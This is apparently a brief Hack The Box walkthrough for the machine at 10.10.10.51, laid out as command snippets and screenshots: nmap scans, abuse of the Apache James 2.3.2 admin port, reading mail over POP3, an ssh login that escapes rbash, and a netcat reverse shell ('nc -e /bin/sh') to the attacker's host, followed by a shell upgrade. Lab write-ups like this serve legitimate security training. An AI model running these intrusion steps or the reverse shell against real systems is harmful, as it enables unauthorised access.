```
nc 10.10.10.51 4555
telnet 10.10.10.51 110
Escape rbash
LinEnum.sh
reverse shell - nc
move to bash
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.10.51
```
![image](https://user-images.githubusercontent.com/33616880/232411290-0737e4a9-3728-48cc-8020-4d623612be4c.png)


```
nmap -p- -T5 10.10.10.51
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c4dc1085-200e-4e78-8228-8110bf48ae04)


```
Apache James Server 2.3.2
```
![image](https://user-images.githubusercontent.com/33616880/232411391-2215be98-0a72-481c-ada2-a785cb0045de.png)



```
nc 10.10.10.51 4555
```
![image](https://user-images.githubusercontent.com/33616880/232411422-93d8116f-02c2-4fdf-b374-6702e705afc7.png)



```
telnet 10.10.10.51 110
```
![image](https://user-images.githubusercontent.com/33616880/232411664-8c8044ef-1c89-441b-853f-55518768d4d7.png)
![image](https://user-images.githubusercontent.com/33616880/232411688-9d73ae68-51d5-401c-b5b3-b72917a225a4.png)



![image](https://user-images.githubusercontent.com/33616880/232411771-ce69392f-c335-4296-b432-bad7cf52866c.png)



```
ssh mindy@10.10.10.51 -t bash
```
![image](https://user-images.githubusercontent.com/33616880/232411850-787a182b-1bf5-409f-b09d-8b6d55570d87.png)



![image](https://user-images.githubusercontent.com/33616880/232417537-d85deedc-395d-4e0e-a8ee-c581372f6d2c.png)



```
nc -e /bin/sh 10.10.14.7 4444
```
![image](https://user-images.githubusercontent.com/33616880/232412026-ce4ec090-a949-4f8d-ac04-58a730fc8cfd.png)
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![image](https://user-images.githubusercontent.com/33616880/232412051-828a625b-5617-4f42-994f-026aeb567b26.png)

